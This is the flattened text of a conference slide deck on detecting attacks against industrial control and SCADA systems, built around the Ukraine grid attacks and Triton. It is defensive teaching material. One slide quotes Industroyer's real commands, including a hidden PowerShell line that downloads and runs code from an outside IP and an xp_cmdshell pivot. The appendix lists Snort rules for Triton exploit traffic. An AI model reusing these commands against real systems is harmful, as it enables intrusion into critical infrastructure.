SESSION ID: SBX4-W1
ICS/SCADA Attack Detection 101

Oleg Kolesnikov
VP of Threat Research Securonix

Harshvardhan Parashar
Security Researcher Securonix

#RSAC

#RSAC

ICSMAP vs. Major Real-wUKoRArINlEd ICS/SUCKRAAINDE A Attacks since 2015

BLACKENERGY

INDUSTROYER

2019+ ?

SAUDI ARABIA TRITON

https://icsmap.shodan.io/

#RSAC
Agenda
#1 - Introduction, recap #2 - High-Profile SCADA Attacks - TTPs & Techniques #3 - DEMO - SCADA Attacks #4 - SCADA Attack Detection ­ Log Sources, Detection Approaches, Common Blindspots, ML/AD use case examples #5 - DEMO - SCADA Attack Detection
3

#RSAC
Real-world ICS/SCADA attacks used as a basis for this talk ­ Blackenergy, Industroyer, and Triton

Target #1 - West Ukraine
230,000 people without power in freezing temps

Blackenergy3

Target #2 ­ Kiev (capital)
~1/5 of Kiev population without power in T=~0F;

Industroyer/Crashoverride

https://is.muni.cz/th/uok5b/BP_Mikova_final.pdf+&cd=3&hl=en&ct=clnk&gl=us

#RSAC
Insider Perspective - ICS/SCADA Attacks Targets

Blackenergy Target - West Ukraine (Chernivtsi, Ivano-Frankivsk)

Industroyer Target Capital of Ukraine (Kiev)

#RSAC
OT/ICS/SCADA CONCEPTS QUICK REVIEW - I
Operational Technology (OT)/ Industrial Control Systems (ICS) - must-not-fail, hard real-time systems used to manage industrial operations (Electric, Oil & Gas, Water etc) where usually availability, integrity, and timeliness are most critical

#RSAC
OT/ICS/SCADA CONCEPTS QUICK REVIEW - II
HMI ­ Human Machine Interface. User interface that connects an operator to a controller for an ICS/SCADA system. Using HMI, the operator can see schematics of the processes and systems, turn switches on/off etc.
INDUSTROYER TARGET HMI 

#RSAC
OT/ICS/SCADA CONCEPTS QUICK REVIEW - III
· PLC-Programmable Logic Controller · Ladder Logic · EWS, Historian, OPC etc.
Some common OT/ICS/SCADA Protocols: Modbus/TCP tcp/502, S7 tcp/102, IEC 60870-5-*/IEC104 tcp/2404, DNP3, Ethernet/IP tcp/44818, Profinet tcp/34962 etc.

#RSAC
OT/ICS/SCADA CONCEPTS QUICK REVIEW - ISA95/Purdue - IV

Attacker

Enterprise

DMZ

Operational / SCADA

PLC & RTU

Sensors & Actuators

Remote Operator/VPN

Internet

DMZ Web Servers Email Server
IT

Enterprise Workstations Web Servers Business Servers Server Printer
L4

Historian

Engineering

Jump server/Remote Workstation (EWS)

Access

HMI

Patch Server / AV / WSUS

Historian Database Active Directory
Etc.

PLC RTU IED

Sensors Actuators

L3
Operational Control Network

L2/3
Supervisory Network

L1
Control Network

ISA95/Purdue L0
Physical Process /
Field Network

OT

High-Level ICS/SCADA Real-world Attack Progression Behaviors ­ ICS ATT&CK #RSAC

Persistence

Privilege Escalation

Valid Accounts

Module Firmware

Exploitation of Vulnerability

External Remote

Service

Modify Control

Logic

Modify System

Settings

Memory Residence

System Firmware

Defense

Operator

Evasion

Evasion

Rootkit

File Deletion

Block Serial Comm Port

Modify Event Log Modify I/O Image

Alternate Modes of Operation
Masquerading

Modify Reporting Settings
Modify Reporting Message

Modify System Block Reporting

Settings

Message

Spoof Reporting Message

Modify Tag

Modify Control Logic
Modify Physical Device Display
Modify HMI/Historian
Reporting Modify Parameter

Credential Access

Discovery

Lateral Movement

Execution

Network Sniffing

Exploitation of Vulnerability

Brute Force

Device Information

Default Credentials

Scripting

Default Credentials

Control Process Valid Accounts

Graphical User Interface

Exploitation of Vulnerability

Role Identification

External Remote Service

Command-Line Interface

Credential

Location

Modify Control Modify System

Dumping

Identification

Logic

Settings

Network Connection Enumeration

Man in the Middle

Serial Connection

Alternate Modes

Enumeration

of Operation

I/O Module

Enumeration

Remote System

Discovery

Network Service

Scanning

Command and Control
Connection Proxy Commonly Used
Port

Disruption Destruction
Module Firmware Spoof Command Message Block Command Message
Modify I/O Image Exploitation of Vulnerability

Modify Reporting Settings

Modify Reporting Message Block Reporting Message Spoof Reporting Message
Modify Tag

Modify Control Logic

Device Shutdown Modify Parameter System Firmware Modify Command Message Block Serial Comm Port Modify System Settings Alternate Modes of Operation

Masquerading

Source: MITRE

Blackenergy* - Some Relevant high-level attack

#RSAC

techniques/behaviors - Highlights

*** No ICS/SCADA protocol or PLC payloads, worked mostly on IT side/leveraged compromised HMI, some highlights:
· Highly modular, initial infiltration via macro documents, user credential compromise for access, manual manipulation of SCADA controls (HMI/rdesktop);
· Firmware Attacks (UPS,serial-to-Ethernet) ­ Attacked firmware on substation network gateways, scheduled UPS outages;

11

Industroyer ­ Some Relevant high-level attack

#RSAC

techniques/behaviors - Highlights

*** Highly modular, targeted, ICS/SCADA protocol payloads (IEC 101, IEC 104, IEC 61850, OPC DA) Uses 12+ techniques from ICS ATT&CK + many from ENTERPRISE ATT&CK, some highlights:

- Created Attacker User Accounts ­ "Admin" & "" (SYSTEM) & attempted remote access, created services for persistence etc.

- Used LoL commands to pivot into ICS/SCADA via Windows LM/SQL (Historians?) e.g. EXEC xp_cmdshell `net use L: ... \C$', powershell.exe -nop -w hidden ­c ... IEX $l.downloadstring('http://188.42.253.43:8801/msupdate') etc.

- C2 over tcp/443, egress via a static internal proxy (10.15.1.69) to TOR exit node (5.39.218.152:443)

- Spoofed ICS/SCADA Command Messages ­ Used IEC 101/104 ICS SCADA payloads to control circuit breakers/de-energize substations by changing state to OFF, ON, OFF & OPC DA to change the state discovered via IOPCSyncIO by writing 0x01 value twice;

+much more.

12

Triton/Trisis - Some relevant high-level attack

#RSAC

techniques/behaviors - Highlights

*** Contained ICS/SCADA SPLC/SIS payloads (Triconex), relied on operator placement & execution, some highlights:

- Modified Control Logic ­ Reprogrammed SPLC/SIS logic to allow unsafe conditions to persist;

- Exploited a vulnerability ­ Injected custom PowerPC payload exploiting a vuln in device Firmware to escalate privileges, disabling firmware RAM/ROM consistency check, changes a jumptable entry point to the added code;

13

#RSAC
ICS/SCADA Attacks - Demo

#RSAC
Turning you into ICS/SCADA Attack Detection Superheroes

#RSAC

ICS/SCADA Attack Detection ­ Collecting the required telemetry/logs

Attacker

Enterprise

DMZ

Operational / SCADA

PLC & RTU

Sensors & Actuators

Remote Operator/VPN

Internet

DMZ Web Servers Email Server

Enterprise Workstations Web Servers Business Servers Server Printer
L4

Historian Jump server/Remote
Access Patch Server / AV /
WSUS

Engineering Workstation (EWS)
HMI Historian SCADA Server Active Directory
Etc.

L3
Operational Control Network

L2/3
Supervisory Network

PLC

Sensors

RTU

Actuators

IED

L1
Control Network

ISA95/Purdue L0
Physical Process /
Field Network

#RSAC
ICS/SCADA Attack Detection ­ Log/data sources - Examples
Operational Technology/Equipment/OPC/SCADA Applications/Historian/Process Values ­ PLC, SIS, UPS, controllers etc. 1/6/2019 3:32:17.179 PM Event ID: 16#, CPU info: Follow-on operating mode change, CPU changes from STARTUP to RUN mode, PLC_1 13.02.2019 19:02:49 System: FTP user `sys_ups_t00r' logged in from 10.22.212.20. 0x0016 13.02.2019 19:07:32 System: Update successful. 0x004A 13.02.2019 05:42:45 UPS: Restored the local network management interface-to-UPS communication. 1/9/2019,32,0,FALSE,1/9/2019,32,0,FALSE,1/9/2019,32,0,FALSE,1/9/2019,32,0,FALSE,1/9/2019,32 14:40:46,610.9607542341123,,205.9728546142578,666.8856201171875,244.8952178955078,243.23147583007812,0.0,0.0,0.0,0.0,0. 0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,False,False,False,[07] [2019-02-02 09:05:51.2407620131] (6) EWS001-PC\C:\Program Files (x86)\Matrikon\OPC\Common\OPCExplorer.exe ­ COPCServerSniffer::GetStatus() ­(*ppServerStatus)->dwServerState=0x00000001
Network ­ VPN, Firewall, SPAN/pcaps, IEC104, Modbus, DNP3 etc. "02","2019-02-02 16:34:24.281723","192.168.1.101","102.129.10.100","Modbus/TCP","78","Response: Trans: 6; Unit: 1, Func: 6: Write Single Register","502","54744","â\234\223","1","Write Single Register","4373","b5d9" 02.02.2019 22:01:13 System: FTP user 'apc' logged in from 192.168.11.22. 0x0010
Endpoints ­ sysmon, osquery, remote access, lightweight agents, commercial ETDR tools etc. RServer3 2019.03.06 09:30 Connection from JUMP1-ICS (10.7.1.61) (Admin): Remote Screen Connection Feb 2 13:34:38 10.77.1.133 Hostname=HMI.control,EventType=INFO,SeverityValue=2,Severity=INFO,EventID=11, [...],AccountName=operator32,UserID=S-1-5-18, AccountType=User,Message="File created: UtcTime: 2019-02-02 13:34:37.496, Image: C:\\Users\\operator32\\AppData\\Local\\Temp\\is-NJ8EO.tmp\\dNp3.exe, TargetFilename: C:\\Users\\operator32\\AppData\\Roaming\\254930CB44240002\\haslo-ng.exe
17

#RSAC
Traditional ICS/SCADA Attack Detection 101 - Overview

Use case category

Semantics/examples

Whitelisting/asset/policy violations
Basic known attack/malware-specific checks Basic protocol/informative checks
Basic threshold-based checks

Default password use w/ICS assets, connections to PLC from an IP address that is not part of the allowed set of IP addresses, protocol mismatch (Modbus on nonModbus ports etc), use of restricted function codes (Writes etc), Serial function code use on non-serial devices etc.
Signatures associated with known ICS attacks e.g. ExplReadRam, ExplExec, ExplWriteRam Attempts (Triton/Trisis/Hatman), ICS vulnerabilities stream (ICSCERT, SCADA testbed hack-a-thon datasets) basic POC checks etc.
Read and Write Attempts (Modbus), Trivial Function code scans, Diagnostics, Force Listen Only Mode, System Detection, Read Slave, Warm Restart, Cold Restart, Points List Scan, Incorrect/Illegal Packet Lengths, Modbus TCP packet size>300 etc, Exception Code Delays, SPLC Communication Attempts etc.
Ladder Logic Upload Attempts (e.g. >1 per source every 60 seconds), TriStation Connection Request to SPLC (>3 per source in 900 seconds), Points List Scan (>5 per source in 60), Function Code Scan (>3 per source in 60), Acknowledge Exception Code Delay (>3 per source in 60), Failed Login attempts > 3 in 30 mins etc.

#RSAC
Common SCADA Attack Detection Challenges/Blindspots
Some of the common blindspots/challenges for traditional ICS/SCADA attack detection (important to cover to detect real-world attacks, not only for e.g. NERC CIP* compliance):
- "Connecting the dots" ­ Ability to connect alarms from different sources (process values/PLC/OPC, network, detection solutions, agents etc) to detect SCADA attacks - "Fragmented/Siloed ML/behavior analysis" ­ Ability to automatically baseline the behavior of your SCADA environment as a whole i.e. ML on top of traditional/behavior alarms - Monitoring privileged user/account behavior (insiders, SCADA operators, engineers etc) +others (visibility, IT/OT cooperation etc.)

#RSAC
Importance of Connecting the Dots Across ICS Kill Chain Automatically

#RSAC

Taking into account ICS/SCADA Attack Progression e.g. IT->OT

ATT&CK for Enterprise Initial Access Drive-by Compromise

Execution CMSTP

Exploit Public-Facing Application Hardware Additions

Command-Line Interface Control Panel Items

Replication Through Removable Media Spearphishing Attachment

Dynamic Data Exchange Execution through API

Persistence Accessibility Features AppCert DLLs AppInit DLLs Application Shimming Authentication Package

Privilege Escalation

Defense Evasion

Credential Access

Access Token Manipulation Access Token Manipulation Account Manipulation

Accessibility Features

Binary Padding

Brute Force

AppCert DLLs

BITS Jobs

Credential Dumping

AppInit DLLs

Bypass User Account Control Credentials in Files

Application Shimming

CMSTP

Credentials in Registry

Discovery Account Discovery
Application Window Discovery Browser Bookmark Discovery File and Directory Discovery

Lateral Movement Application Deployment Software Distributed Component Object Model Exploitation of Remote Services Logon Scripts

Network Service Scanning Pass the Hash

Spearphishing Link Spearphishing via Service Supply Chain Compromise Trusted Relationship Valid Accounts

Execution through Module Load Exploitation for Client Execution Graphical User Interface
InstallUtil
LSASS Driver
Mshta
PowerShell
Regsvcs/Regasm Regsvr32

BITS Jobs
Bootkit
Browser Extensions
Change Default File Association Component Firmware
Component Object Model Hijacking Create Account
DLL Search Order Hijacking External Remote Services

Bypass User Account Control Code Signing DLL Search Order Hijacking Component Firmware

Exploitation for Credential Access Forced Authentication

Exploitation for Privilege Component Object Model Hooking

Escalation

Hijacking

Extra Window Memory

Control Panel Items

Input Capture

Injection

File System Permissions

DCShadow

Kerberoasting

Weakness

Hooking

Deobfuscate/Decode Files or LLMNR/NBT-NS Poisoning

Information

Image File Execution Options Disabling Security Tools

Network Sniffing

Injection

New Service

DLL Search Order Hijacking Password Filter DLL

Path Interception

DLL Side-Loading

Private Keys

Rundll32 Scheduled Task Scripting

File System Permissions

Port Monitors

Weakness

Hidden Files and Directories Process Injection

Hooking

Scheduled Task

Exploitation for Defense Evasion Extra Window Memory Injection File Deletion

Replication Through Removable Media Two-Factor Authentication Interception

Service Execution

Hypervisor

Service Registry Permissions File System Logical Offsets

Weakness

Signed Binary Proxy

Image File Execution Options SID-History Injection

Hidden Files and Directories

Execution

Injection

Signed Script Proxy Execution Logon Scripts

Valid Accounts

Image File Execution Options

Injection

Third-party Software

LSASS Driver

Web Shell

Indicator Blocking

Trusted Developer Utilities Modify Existing Service

Indicator Removal from

Tools

User Execution

Netsh Helper DLL

Indicator Removal on Host

d

d

d

Network Share Discovery Pass the Ticket

Password Policy Discovery Remote Desktop Protocol

Peripheral Device Discovery Remote File Copy

Permission Groups Discovery Remote Services

Process Discovery Query Registry

Replication Through Removable Media Shared Webroot

Remote System Discovery Taint Shared Content

Security Software Discovery Third-party Software

System Information

Windows Admin Shares

Discovery

System Network

Windows Remote

Configuration Discovery Management

System Network Connections

Discovery

System Owner/User

Discovery

System Service Discovery

System Time Discovery

Collection Audio Capture

Exfiltration Automated Exfiltration

Command And Control Commonly Used Port

Automated Collection Clipboard Data

Data Compressed Data Encrypted

Communication Through Removable Media Connection Proxy

Data from Information

Data Transfer Size Limits

Repositories

Data from Local System

Exfiltration Over Alternative

Protocol

Data from Network Shared Exfiltration Over Command

Drive

and Control Channel

Data from Removable Media Exfiltration Over Other

Network Medium

Data Staged

Exfiltration Over Physical

Medium

Email Collection

Scheduled Transfer

Custom Command and Control Protocol Custom Cryptographic Protocol Data Encoding
Data Obfuscation
Domain Fronting
Fallback Channels

Input Capture

Multi-hop Proxy

Man in the Browser

Multi-Stage Channels

Screen Capture

Multiband Communication

Video Capture

Multilayer Encryption Remote Access Tools

Remote File Copy

Standard Application Layer Protocol Standard Cryptographic Protocol Standard Non-Application Layer Protocol Uncommonly Used Port

Web Service

SOURCE:MITRE

#RSAC
(cont'd)

Time Providers Valid Accounts Web Shell Windows Management Instrumentation Event Subscription Winlogon Helper DLL

ATT&CK for ICS Persistence External Remote Services
Memory Residence Modify Control Logic Modify System Settings

Privilege Escalation Exploitation of Vulnerability
Valid Accounts

Defense Evasion Alternate Modes of Operation File Deletion Masquerading Modify Event Log

Module Firmware

Modify System Settings

System Firmware Valid Accounts

Rootkit

Regsvcs/Regasm Regsvr32 Rootkit Rundll32

Scripting Signed Binary Proxy Execution Signed Script Proxy Execution

SIP and Trust Provider Hijacking Software Packing Timestomp Trusted Developer Utilities Valid Accounts Web Service

Operator Evasion Block Reporting Message

Credential Access Brute Force

Discovery Control Process

Lateral Movement Default Credentials

Execution Command-Line Interface

Command and Control Commonly Used Port

Block Serial Comm Port Modify Control Logic Modify HMI/Historian Reporting Modify I/O Image
Modify Parameter Modify Physical Device Display Modify Reporting Message Modify Reporting Settings Modify Tag
Rootkit Spoof Reporting Message

Credential Dumping

Device Information

Default Credentials

I/O Module Enumeration

Exploitation of Vulnerability Location Identification

Network Sniffing

Network Connection Enumeration Network Service Scanning Network Sniffing

Remote System Discovery Role Identification Serial Connection Enumeration

Exploitation of Vulnerability Exploitation of Vulnerability Connection Proxy

External Remote Services Graphical User Interface

Modify Control Logic

Man in the Middle

Valid Accounts

Modify System Settings

Scripting Alternate Modes of Operation

Disruption Alternate Modes of Operation Block Command Message Block Reporting Message Block Serial Comm Port

Destruction Block Command Message
Block Reporting Message Device Shutdown Exploitation of Vulnerability

Device Shutdown

Modify Command Message

Exploitation of Vulnerability Modify Control Logic

Masquerading

Modify I/O Image

Modify Command Message Modify Parameter

Modify Control Logic

Modify Reporting Message

Modify I/O Image

Modify Reporting Settings

Modify Parameter Modify Reporting Message Modify Reporting Settings Modify System Settings Modify Tag Module Firmware Spoof Command Message Spoof Reporting Message System Firmware

Modify Tag Module Firmware Spoof Command Message Spoof Reporting Message System Firmware

SOURCE:MITRE

ML/Anomaly Detection ICS/SCADA Attack Detection Use Cases ­ #RSAC

Some High-Level Examples (More details - see demo)

Use case

Type

Semantics

All traditional ICS/SCADA Attack Detection (alerts from traditional detection components both active/passive including discrete/specific checks such as firmware update/integrity checks etc. fed into centralized system logging & monitoring & ingested by ML models in e.g.
next-gen SIEM) + ML/Anomaly Detection-based use cases e.g.

Suspicious User Activity ­ Diurnal ICS/SCADA Operator/Engineer Login Analytic
Suspicious VPN Activity ­ Unusual VPN/Remote Access Source Analytic

UEBA/Account Monitoring VPN/Remote Access

Unusual login time/day for an operator/engineer;
Attempts to connect to ICS network through VPN/Remote/Jump server from an unusual source e.g. using compromised credentials;

Suspicious ESP Activity ­ Unusual App/Proto Observed Analytic
ICS/SCADA Logging Activity Behavior Change ­ Potential Monitoring Disruption Analytic

ESP Firewall, Network TAPs Multiple

Unusual protocol observed within Electronic Security Perimeter (ESP);
Unusual change in the logging activity observed e.g. trivial example is firewall log data lapse for an asset etc;

Suspicious ICS/SCADA Process Activity ­ Physics/Chemical Properties/Process State Invariant Deviation Analytic
Unusual CCA Alarm ­ Potential Loss of Functionality Analytic

Process* Multiple

Process deviations from expected behavior/states e.g. violating physics/chemistry properties;
Unusual alarm associated with Critical Cyber Asset (CCA) observed within ESP;

ML/Anomaly Detection ICS/SCADA Attack Detection Use Cases ­ #RSAC Some High-level Examples (More details - see demo)

Use case
Suspicious Process Activity ­ Unusual CPU State/Error Analytic

Type
Diagnostics

Semantics
Unusual CPU state/error detected on an ICS device;

Suspicious Communication Activity ­ Rare ICS/SCADA/Component Connection Analytic
Suspicious Endpoint Activity ­ Unusual Parent/Child Process Analytic
Suspicious Communication Activity ­ Unusual Firmware/Logic Update Analytic
Suspicious Modbus Activity ­ Unusual Function Codes Analytic
Suspicious Periodic Activity ­ Potential C2 Communication Analytic
Suspicious Process Activity ­ Unusual Process Value Analytic
+many more.

Network* ETDR Network* Process/Network Network* OPC

PLC connecting to another PLC, PLC attempting to connect to DMZ etc.
Suspicious parent-child process combination e.g. cscript spawning exe/rundll32 on EWS;
Unusual attempts to update firmware on e.g. ICS network switiches and other infrastructure devices
Function codes not seen in BAU;
Periodic communication from your ICS/SCADA infrastructure likely associated with command-and-control/beaconing;
Unusual process value compared to the baseline.

#RSAC
Practical ICS/SCADA Attack Detection Demo

#RSAC
Apply What You Have Learned Today
Next week you should: Identify real-world ICS/SCADA attacks and techniques applicable to your environments & your visibility gaps
In the first three months following the presentation you should: Determine log sources & use cases to address - user monitoring, agent/host-monitoring, connecting the dots etc, select solutions
Within six months you should: Deploy & test solutions to increase chances of detecting modern ICS/SCADA attacks/behaviors early
26

#RSAC

References
[1] North American Electric Reliability Corporation. Critical Infrastructure Protection (CIP) Standards. https://www.nerc.com/pa/Stand/Pages/CIPStandards.aspx.
[2] D.Coats. US Intelligence Community: Worldwide Threat Assessment ­ 2019. https://www.dni.gov/files/ODNI/documents/2019-ATA-SFR--SSCI.pdf.
[3] H.Yan et al. A survey of intrusion detection on industrial control systems. In Proceedings of the 2018 International Journal of Distributed Sensor Networks.
[4] BSI. RAPSN TRITON detection rules. https://www.bsi.bund.de/DE/Themen/Industrie_KRITIS/ICS/Tools/RAPSN_SETS/RAPSN_SETS_node.html;jsessionid=F8F4CCB23BE2D4B8A2B7DE1759 447662.2_cid360
[5] D.Peterson. DigitalBond Quickdraw Rules. https://github.com/digitalbond/Quickdraw-Snort.
[6] L.Maglaras. Intrusion Detection in SCADA Systems using Machine Learning Techniques. https://www.researchgate.net/profile/Leandros_Maglaras/publication/325128777_Intrusion_Detection_in_SCADA_Systems_using_Machine_Learni ng_Techniques/links/5af9beb80f7e9b3b0beef9fd/Intrusion-Detection-in-SCADA-Systems-using-Machine-Learning-Techniques.pdf
[7] C.Hurd, M.V.McCarthy. A Survey of Security Tools for the Industrial Control System Environment. https://www.osti.gov/biblio/1376870
[8] S.Adepu et al. Assessing the Effectiveness of Attack Detection at a Hackfest on Industrial Control Systems. iTrust, Center for Research in Cyber Security Singapore University of Technology and Design, Singapore (SUTD).
[9] T.Morris. Industrial Control System (ICS) Cyber Attack Datasets. https://sites.google.com/a/uah.edu/tommy-morris-uah/ics-data-sets
[10] A.Almehmadi. SCADA Networks Anomaly-based Intrusion Detection System. In Proceedings of the 11th International Conference on Security of Information and Networks.

#RSAC

References
[11] N.Tippenhauer et al. HAMIDS: Hierarchical Monitoring Intrusion Detection System for Industrial Control Systems. In Proceedings of the 2nd ACM Workshop on Cyber-Physical Systems Security and Privacy.
[12] A.Chester. A Review into Industroyer Command and Control Protocol. Secarma. 2017. https://cdn2.hubspot.net/hubfs/3853213/Labs/Industroyer_command_and_control_protocol-1.pdf?t=1525959231911
[13] D.Beresford. Siemens Simatic S7 PLC Exploitation. Nsslabs. Blackhat USA 2011. https://media.blackhat.com/bh-us11/Beresford/BH_US11_Beresford_S7_PLCs_Slides.pdf
[14] Dragos. Dragos ICS Reading List. https://dragos.com/blog/industry-news/a-dragos-industrial-control-system-security-readinglist/
[15] Joe Slowik. Crashoverride. Anatomy of an Attack. VB 2018. https://www.virusbulletin.com/uploads/pdf/conference_slides/2018/Slowik-VB2018-CRASHOVERRIDE.pdf
[16] Manuel Bermudez Casado. CCN-CERT/Enagas. https://www.ccn-cert.cni.es/pdf/documentos-publicos/xi-jornadas-stic-ccncert/2578-m11-07-radiografia-de-un-ataque/file.html.
[17] ISA99 Standards.Security for Industrial Automation and Control Systems. https://www.isa.org/templates/twocolumn.aspx?pageid=124560.
[18] K.Stouffer et al. Guide to Industrial Control Systems (ICS) Security. https://csrc.nist.gov/publications/detail/sp/800-82/rev2/final.
[19] D.Peterson. Insanely Crowded ICS Anomaly Detection Market. https://www.digitalbond.com/blog/2017/05/22/insanelycrowded-ics-anomaly-detection-market/.

#RSAC

#RSAC
Special thanks
MITRE ICS ATT&CK team

Harshvardhan Parashar harsh@securonix.com

Questions?

Oleg Kolesnikov ok@securonix.com

Thank you!

Some traditional ICS/SCADA Attack Detection Use Cases ­

#RSAC

Examples ­ Triton/Trisis SIS Tristation Protocol SCADA Attack

Rules

# Alert on any Connection Request that is sent to a SPLC on UDP/$TS_PORT unauthorized alert udp !$TS_EWS any -> $TS_CONTROLLER $TS_PORT (msg:"TriStation Connection Request to SPLC attempt From Non Authorized Host"; sid:851750010; rev:3; content:"|01 00 00 00 01 FC|"; offset:0; depth:6; classtype:bad-unknown;)

# Log on any Execution Command that does Run Program and is sent to a SPLC on UDP/$TS_PORT from $TS_EWS log udp $TS_EWS any -> $TS_CONTROLLER $TS_PORT (msg:"TriStation Execution Command Run Program to SPLC attempt from $TS_EWS"; sid:851750120; rev:3; content:"|05 00|"; offset:0; depth:2; content:"|00 00 14|"; offset:4; depth:3; classtype:bad-unknown;)

# Alert on Trisis/Triton/HatMan Exploit Execution attempt: ExplExec

alert udp any any -> $TS_CONTROLLER $TS_PORT (msg:"TriStation TRITON/TRISIS/HATMAN ExplExec

attempt"; sid:851750902; rev:3; content:"|05 00|"; offset:0; depth:2; content:"|00 00 1D|"; offset:4;

depth:3; content:"|F9 FF|"; offset:14; depth:2; classtype:trojan-activity;)

Source: BSI/RAPSN

33

#RSAC
Some traditional ICS/SCADA Attack Detection Use Cases ­ Examples ­ Digitalbond Quickdraw Modbus/DNP3 Rules
alert tcp !$MODBUS_CLIENT any -> $MODBUS_SERVER 502 (flow:from_client,established; content:"|00 00|"; offset:2; depth:2; pcre:"/[\S\s]{3}(\x05|\x06|\x0F|\x10|\x15|\x16)/iAR"; msg:"SCADA_IDS: Modbus TCP - Unauthorized Write Request to a PLC"; reference:url,digitalbond.com/tools/quickdraw/modbus-tcp-rules; classtype:bad-unknown; sid:1111007; rev:1; priority:1;) ... alert tcp $MODBUS_CLIENT any <> $MODBUS_SERVER 502 (flow:established; dsize:>300; msg:"SCADA_IDS: Modbus TCP - Illegal Packet Size, Possible DOS Attack"; reference:url,digitalbond.com/tools/quickdraw/modbus-tcp-rules; classtype:non-standard-protocol; sid:1111008; rev:1; priority:1;)
34

#RSAC
Some traditional ICS/SCADA Attack Detection Use Cases ­ Examples ­ Hybrid Passive-Active Heuristics/Rules - SENAMI
Captures and parses ICS/SCADA packets and actively polls PLC for certain variables in active mode ­ SENAMI by WilliamJardine https://github.com/WilliamJardine/SENAMI/blob/master/IDS/ids.py
Source: 4SICS/NF
35

ICS/SCADA Attack Detection ­ Anomalies ­ Machine

#RSAC

Learning: Some Existing Work ­ Highlights - I

Zeng et al. https://link.springer.com/chapter/10.1007/978-981-13-2384-3_32

ICS/SCADA Attack Detection ­ Anomalies ­ Machine

#RSAC

Learning: Some Existing Work ­ Highlights - II

Zeng et al. https://link.springer.com/chapter/10.1007/978-981-13-2384-3_32

#RSAC
Sample ICS/SCADA CTF Attacks/Categories - I
[8]

#RSAC
Sample ICS/SCADA CTF Attacks/Categories - II
[8]

#RSAC
Physics-based ICS/SCADA Attack Example
https://dl.acm.org/citation.cfm?id=3203245

#RSAC
Physics-based Attack Detection: Approaches
Secure State Estimation - find a subset of sensors that are sending false information using models of physical system satisfying equations
Clustering - learn unsupervised clustering models containing the pair-wise relationship between variables of a process.
Detecting Safety Violations and Response ­ Checks that the control signals will not drive the control system to an unsafe state and reconfigures the system when a safety violation is detected
Detecting Malicious Control Commands - Use contingency analysis to predict the consequences of control commands, determining a set of safe states using set theory
Active monitoring for sensors ­ Leverages an approach that has the physical actuator respond to a physical challenge.
https://dl.acm.org/citation.cfm?id=3203245

#RSAC
ICS Attack Kill Chain
SOURCE: SANS/DRAGOS

#RSAC
ICS Cyber Kill Chain ­ SANS
https://www.nerc.com/pa/CI/ESISAC/Documents/EISAC_SANS_Ukraine_DUC_18Mar2016.pdf+&cd=1&hl=en&ct=clnk&gl=us

